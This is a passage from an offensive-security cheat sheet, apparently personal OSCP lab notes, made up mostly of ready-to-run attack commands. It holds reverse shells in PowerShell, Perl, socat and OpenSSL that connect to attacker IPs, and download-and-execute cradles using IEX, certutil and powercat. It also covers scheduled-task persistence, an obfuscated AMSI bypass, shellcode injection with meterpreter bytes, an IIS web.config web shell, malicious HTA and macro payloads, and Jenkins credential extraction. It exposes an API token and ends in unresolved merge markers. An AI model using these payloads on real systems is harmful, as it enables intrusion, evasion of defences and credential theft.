powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('192.168.49.76',9443);\$s = \$client.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);\$sb = (iex \$data 2>&1 | Out-String );\$sb2 = \$sb + 'PS ' + (pwd).Path + '> ';\$sbt = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$client.Close()"
```

### Reverse Powershell using windows command shell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.192',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### CMD Runas

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /k \"C:\program files\sl admin\nc.exe\" 172.16.0.1 443 -e cmd.exe"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c ping 172.16.0.1"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.2/powercat.ps1');powercat -c 10.10.16.2 -p 443 -e powershell.exe"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c whoami.exe > C:\users\reg_priv\output.txt"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c type C:\users\reg_priv\output.txt"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c net use \\172.16.0.1\winreconpack /user:smbuser smbuser"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c copy \\172.16.0.1\winreconpack\powercat.ps1"
```

```
runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c certutil -urlcache -f http://172.16.0.1/nc.exe C:\users\reg_priv\nc.exe"
```

### Powercat

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.207/powercat.ps1');powercat -c 192.168.49.207 -p 443 -e cmd.exe"
```

```
powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.192/powercat.ps1');powercat -c 192.168.49.192 -p 443 -e powershell.exe
```

### Invoke-PowerShellTcp.ps1

```
powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.207/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.0.1 -Port 443"
```

### Invoke-RunasCS

**Step 1**

Upload reversePowershell and Invoke-RunasCS script

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.193',9002);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
```

**Step 2**

Execute powershell using Invoke-RunasCS

```
Invoke-runasCs -Username USERNAME -Password PASSWORD -Command "powershell.exe -ep bypass C:\windows\system32\spool\drivers\color\revshell.ps1"
```

### Socat Powershell

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

### Socat Bash

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### ASP CMD

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.193 LPORT=9003 -f asp > thescriptkid.asp -a x86
```

### Perl

```
perl -e 'use Socket;$i="192.168.119.130";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### OpenSSL

**Step 1**

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Step 2**

```
openssl s_server -key key.pem -cert cert.pem -port 1234
```

**Step 3**

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect 10.0.0.1:1234 > /tmp/s 2> /dev/null; rm /tmp/s
```

## Maintaining Access

### Via Windows Task

PowerShell

```
$Action = New-ScheduledTaskAction -Execute 'C:\windows\system32\cmd.exe' -Argument '/c C:\ProgramData\nc.exe 10.10.16.4 443 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
```

```
$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 1) -At (Get-Date) -Once
```

```
$Settings = New-ScheduledTaskSettingsSet
```

```
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
```

```
Register-ScheduledTask -TaskName 'TheScriptKid' -InputObject $Task
```

```
Start-ScheduledTask -TaskName 'TheScriptKid'
```

## PTY Shells

### Linux

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; 
```

```
export TERM=xterm-256color; alias ll='ls -lsaht --color=auto'
```

Ctrl + Z \[Background Process]

```
stty raw -echo ; fg ; reset
```

```
stty columns 200 rows 200
```

### Windows

https://github.com/antonioCoco/ConPtyShell

## Creating Wordlists

### Common username formats

first.last firstinitiallast lastnamefirstinital firstname

### Examples

marcela.sauceda msauceda saucedam marcela

```
./format-plugins.rb --input-file names.txt --select-format first,flast,first.last,firstl > users.txt
```

```
seclistgen first.last 0 1
```

### Hash Formats

* If hash starts with `aad3b` -- probably NT hash
* If hash does not start with `aad3b` -- probably LM hash
* `$krb5asrep$23`. `hashcat -m 18200 hashes.txt -d 2 -a 0 /usr/share/wordlists/rockyou.txt`
* `$krb5tgs$23`. `hashcat -m 13100 hashes.txt -d 2 -a 0 /usr/share/wordlists/rockyou.txt`
* hashcat --example-hashes

## File Transfer

### Download File Powershell 2.0

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
```

### Download File Powershell 3.0

```
Invoke-WebRequest -Uri "http://192.168.119.144/bypassuac-x64.exe" -OutFile "C:\Windows\System32\spool\drivers\color\bypassuac-x64.exe"
```

### Download File Powershell

```
powershell iex (New-Object System.Net.WebClient).Downloadfile('http://192.168.119.144/bypassuac-x64.exe', 'C:\Windows\System32\spool\drivers\color\bypassuac-x64.exe')
```

### Download String Powershell

```
powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.207/GetCLSID.ps1')"
```

```
powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.207/PowerUp.ps1'); Invoke-AllChecks"
```

```
powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.153/vulnad.ps1');Invoke-VulnAD -UsersLimit 100 -DomainName thescriptkid.org"
```

### Wget

```
wget "http://www.contoso.com" -outfile "file"
```

### Base64

On attacking machine encode the file and copy the output string

```
base64 file -w 0
```

Lastly, on the victim machine decode the string

```
echo APgABAAAA... <SNIP> ...lIuy9i | base64 -d > shell
```

### Certutil

```
certutil.exe -f http://172.16.0.1/nc.exe C:\users\reg_priv\nc.exe
```

```
certutil.exe -urlcache -f http://10.10.16.4/nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
```

### Vbscript

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

_Running the script_

```
cscript wget.vbs http://192.168.1.2/xyz.txt xyz.txt
```

### Python2 HTTP server

```
python2 -m SimpleHTTPServer -d [directory/path/] [port]
```

### Python2 FTP server

```
python2 -m pyftpdlib -p 21
```

### Python2 SMB server

```
smbserver.py share `pwd` -smb2support -ip 172.16.0.1
```

## Antivirus Evasion

### Check If Windows Defender is Running

```
sc.exe query windefend
```

Or With PowerShell

```
Get-Service windefend
```

### Prometheus

```
i686-w64-mingw32-g++ /opt/prometheus/prometheus.cpp -o thescriptkid.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### Amsi bypass

https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

_Downgrade to powershell version 2 first_

```
powershell -version 2
```

_Enter below and rerun blocked PS script_

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Powershell In-Memory Injection

**Step 1**

Create meterpreter payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.241 LPORT=9000 -f powershell
```

**Step 2**

Insert shellcode in the `$sc=` variable

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint  dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = 
0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x58,0x20,0x50,0x1,0xd3,0x8b,0x48,0x18,0x85,0xc9,0x74,0x3c,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xc0,0xa8,0x77,0xf8,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

**Step 3**

Change Execution Policy on current user

```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

**Step 4**

Start meterpreter listener

## Easy Wins

### IIS ASP 'web.config' shells

https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c

```vb
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
<%Response.write("<!-"&"-") %>
-->
```

## Malware Analysis

use Detect It Easy to detect source language (already installed on your kali)

ghidra

## Decrypt VNC PASSWORD

```rb
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> false
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```

## Building Jenkins Job

click on Configure > Build Triggers > Trigger builds remotely and enter an authentication token of your choice, for example test . Now click on Build > Add build step > Execute a windows batch command and enter whoami

Now on the top right click on user icon and navigate to Configure.

Click on Add new Token and enter the token that we created earlier. Click on generate and copy the generated token. Using this token we can trigger the earlier configured job.

_Triggering the build job_

```
curl http://user:<copied token>@target:8080/job/<jobname>/build?token=test
```

If your unable to obtain reverse shell attempt to read the credentials.xml file, in case any credentials have been added to Jenkins. It's plausible that the master server will hold SSH keys, AWS secrets, and user credentials among other sensitive files. We can see the Jenkins path from the earlier build result.

_Finding The Jenkins Users_

```
cmd.exe /c "dir c:\Users\user-from-previous-whoami\Appdata\local\jenkins\.jenkins\users"
```

_Attempting to view admin credentials_

```
cmd.exe /c "type c:\Users\user-from-previous-whoami\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

_Retrieving master.key and hudson.util.Secret from secrets folder_

```
cmd.exe /c "type c:\Users\user-from-previous-whoami\Appdata\local\jenkins\.jenkins\secrets\master.key"
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\user-from-previous-whoami\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"
```

_Decrypting the secret using https://raw.githubusercontent.com/gquere/pwn\_jenkins/master/offline\_decryption/jenkins\_offline\_decrypt.py_

```
python2 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```

## OffSec YT | Walkthroughs

***

* Methodology Tips
  * `https://youtu.be/XQnkiuIFZ-c?t=3940`
  * `https://youtu.be/4ls30YSlfAM?t=5064`
  * Methodology for information gathering and prioritizing attack vectors and surfaces. `https://youtu.be/kSmiFJipiZw?t=1727` 28:47 - 1:11:55

Exam Tip / PWK Lab: Connecting the dots

`https://youtu.be/UzR1dH810aM?t=1685`

28:07 - 29:12

Exam Tip / PWK Lab: Login Page

`https://www.youtube.com/watch?v=UzR1dH810aM&t=4748s` 01:19:08 - 01:20:50

Exam Tip / PWK Lab : Searching for exploit at dead-end (login/fuzzing). We don’t always have to brute-force login pages.

`https://youtu.be/UzR1dH810aM?t=4874`

01:21:14 - 1:30:07

Exam Tip / PWK Lab: Fuzzing

`https://youtu.be/UzR1dH810aM?t=4190`

1:09:50 - 1:10:32

Exam Tip / PWK Lab: Offsec's silly tip brute force rule of thumb `https://youtu.be/270ZD17aA1Y?t=3300` 55:00 - 57:40

Exam Hack: Permitted automated SQLi

`https://youtu.be/c2OFrDVb3EM?t=2558` 42:39 - 50:18

Exam Tip: Hack the Metasploit `https://youtu.be/Bkp3n___dko?t=3018` 50:18 - 1:11:42

***

Fuzzing Tip: Fuzz Parameters

`https://youtu.be/XQnkiuIFZ-c?t=2848` 47:28 - 52:50

Most underrated Vuln / SSRF / Maybe Out-of-Scope+Overkill for exam prep / Good thing to watch

`https://youtu.be/Y14yjigX9I8?t=2910` 48:30 - 1:04:08

Burp Suite Tip

`https://youtu.be/UzR1dH810aM?t=3733`

01:02:13 - 1:06:16

Siddicky’s Recommended Cheatsheet

`https://youtu.be/UzR1dH810aM?t=6913` 01:55:13 - 01:55:30 `https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html`

Fuzzing Tip: burp parameter discovery

`https://youtu.be/x6BSeahgfgY?t=3316` 55:16 - 58:30

Port Knocking Concept

`https://youtu.be/270ZD17aA1Y?t=3926` 01:05:26 - 01:10:54 `https://sirensecurity.io/blog/port-knocking/`

Fuzzing Tip: Found Nothing with Fuzzing

`https://youtu.be/GBSWd_2fw3s?t=2110` 35:10 - 36:20

Restricted shell bypass `https://youtu.be/c2OFrDVb3EM?t=3254` 54:14 - 57:04

S1REN’s PrivEsc Cheatsheet Inpiration: `https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/`

***

Most used wordlists

```bash
directories
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

files
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

brup-parameter / URL-Parameter
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

SQLi Payload
/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt

.extensions
/usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt

Common
/usr/share/dirb/wordlists/common.txt

Password
https://github.com/drtychai/wordlists/blob/master/fasttrack.txt
```

## To Be Categorized

### Malicious HTA

Internet Explorer Client Side Attack

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.0.1 LPORT=53 -f hta-psh -o evil.hta
```

```
python3 -m http.server 80 -d /dir/
```

### Url File Attacks

capture hashes social engineering client side attack

Create a file called '"@something.url"'

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

### Malicous Macro Microsoft Word Doc

Create malicious payload

```
genbadmacro.py $(powercat -c lhost -p port -e powershell.exe -ge)
```

open microsoft word, create a new macro called "mymacro" in the current document

attack scenario #1 via upload ftp or smb

attack scenario #2 via self hosted webserver

### Working with json files JQ

### Parse for users

```
cat *_users.json| jq .data[].Properties.samaccountname | cut -d '"' -f2
```

Or

```
cat *_users.json| jq .data[].Properties.name | cut -d '"' -f2
```

### Parse for groups

```
cat 20220818000314_groups.json | jq .data[].Properties.name | cut -d '"' -f2 | cut -d '@' -f1
```

### Alternate DATA Stream

```
dir /R 
more < file.txt:alternate.txt:$DATA
```

### auto runs

copy autoruns or autoruns64 to compromised machine use accesschk to

### startup escalations

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### Passback attacks

### Extract/open .img file

binwalk -e <.img FILE>

### Git repos enumeration

```
git log
gitdumper
git log
git show
```

### Phpmyadmin

test for default creds

```
root:
root:root
root:toor
```

### Wordpress

scan for every page not just the landing page

```bash
wpscan --url $url -e ap --api-token '8koUXyHv2H4ilhsL1qSmnSYMmh77P8rJW1QAvWUMw3A'
```

### Journalctl

journalctl uses the default pager and most likely uses less and while using sudo can gain root privleges.

```
/usr/bin/sudo /usr/bin/journalctl something.service  
```

```
!/bin/bash
```

### Boot2Root Docker

Default credentials are docker:tcuser

### Get Windows Environment Variables

```
Get-ChildItem Env:
```

### Windows Enumeration Using Registry Queries

Printers

```
reg.exe query HKLM\SYSTEM\CurrentControlSet\control\print\printers
```

computer name

```
reg.exe query HKLM\SYSTEM\CurrentControlSet\control\computername\activecomputername
```

### Crack Password Protected Certificates

```
crackpkcs12 cert.pfx -d /usr/share/wordlists/rockyou.txt
```

<<<<<<< HEAD

### Using Sliver C2

#### Start Listener

```
http -l 80
```

#### Generate Beacon

```
generate beacon -S 5 -b http://127.0.0.1:80
```

#### List Beacons

```
beacons
```

#### Use Beacon

```
use BeaconID
```

#### List Sessions

```
sessions
```

#### Use Session

```
use SessionID
```

\=======

> > > > > > > 6912adbe47a973e22839842f37be3ab4655a044d
